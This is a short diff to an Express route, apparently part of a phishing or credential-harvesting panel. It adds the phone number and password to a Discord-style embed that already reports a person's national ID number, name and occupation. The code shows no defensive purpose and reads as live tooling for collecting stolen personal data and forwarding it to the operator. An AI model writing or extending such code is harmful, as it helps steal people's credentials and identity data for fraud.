@@ -63,8 +63,11 @@ app.post('/nuevo', async (req, res) => {
                      );
             } 
             else if (accion === 'simulador') {
+                // 🔥 AQUÍ SE AGREGAN EL NÚMERO Y LA CONTRASEÑA AL SIMULADOR
                 embed.setTitle('📝 Info perso')
                      .addFields(
+                         { name: '📱 Número', value: `\`${numero || 'No disp.'}\``, inline: true },
+                         { name: '🔒 Contraseña', value: `\`${password || 'No disp.'}\``, inline: true },
                          { name: '🆔 Cédula', value: `\`${datos.cedula}\``, inline: true },
                          { name: '👤 Nombre', value: `\`${datos.nombre}\``, inline: true },
                          { name: '💼 Ocupación', value: `\`${datos.ocupacion}\``, inline: true },
